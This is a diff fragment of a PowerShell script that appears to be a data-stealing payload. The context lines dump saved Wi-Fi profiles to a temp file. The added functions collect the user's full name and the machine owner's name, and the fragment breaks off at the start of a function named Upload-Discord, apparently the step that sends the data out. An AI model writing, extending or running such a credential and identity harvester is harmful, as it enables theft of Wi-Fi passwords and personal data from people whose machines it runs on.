@@ -5,7 +5,52 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 
 $wifiProfiles > $env:TEMP/--output.txt
 
-############################################################################################################################################################
+
+##################################
+
+function Get-fullName {
+
+    try {
+    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
+    }
+ 
+ # If no name is detected function will return $env:UserName 
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "No name was detected" 
+    return $env:UserName
+    -ErrorAction SilentlyContinue
+    }
+
+    return $fullName 
+
+}
+
+$fullName = Get-fullName
+
+##################################
+
+function Get-email {
+    
+    try {
+
+    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
+    return $email
+    }
+
+# If no email is detected function will return backup message for sapi speak
+
+    # Write Error is just for troubleshooting
+    catch {Write-Error "An email was not found" 
+    return "No Email Detected"
+    -ErrorAction SilentlyContinue
+    }        
+}
+
+$email = Get-email
+
+
+##################################
 
 function Upload-Discord {
 
